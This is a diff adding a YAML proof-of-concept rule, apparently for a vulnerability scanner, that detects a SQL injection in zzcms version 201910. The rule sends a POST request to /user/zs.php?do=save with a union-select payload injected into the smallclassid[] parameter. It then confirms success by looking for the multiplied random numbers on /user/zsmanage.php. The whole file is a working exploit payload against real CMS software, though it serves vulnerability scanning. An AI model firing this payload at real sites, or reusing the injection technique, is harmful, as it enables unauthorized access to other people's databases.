@@ -1,0 +1,25 @@
+name: poc-yaml-zzcms-zsmanage-sqli
+set:
+  r0: randomLowercase(6)
+  r1: randomInt(40000, 44800)
+  r2: randomInt(40000, 44800)
+rules:
+  - method: POST
+    path: /user/zs.php?do=save
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: >-
+      proname={{r0}}&tz=1%E4%B8%87%E4%BB%A5%E4%B8%8B&prouse={{r0}}&sx%5B%5D=&sx%5B%5D=&sm={{r0}}&province=%E5%85%A8%E5%9B%BD&city=%E5%85%A8%E5%9B%BD%E5%90%84%E5%9C%B0%E5%8C%BA&xiancheng=&cityforadd=&img=%2Fimage%2Fnopic.gif&flv=&zc=&yq=&action=add&Submit=%E5%A1%AB%E5%A5%BD%E4%BA%86%EF%BC%8C%E5%8F%91%E5%B8%83%E4%BF%A1%E6%81%AF&smallclassid[]=1&smallclassid[]=2)%20union%20select%20{{r1}}*{{r2}}%23
+    follow_redirects: true
+    expression: |
+      response.status == 200
+  - method: GET
+    path: /user/zsmanage.php
+    follow_redirects: true
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
+detail:
+  author: JingLing(https://hackfun.org/)
+  version: zzcms201910
+  links:
+    - https://github.com/JcQSteven/blog/issues/18
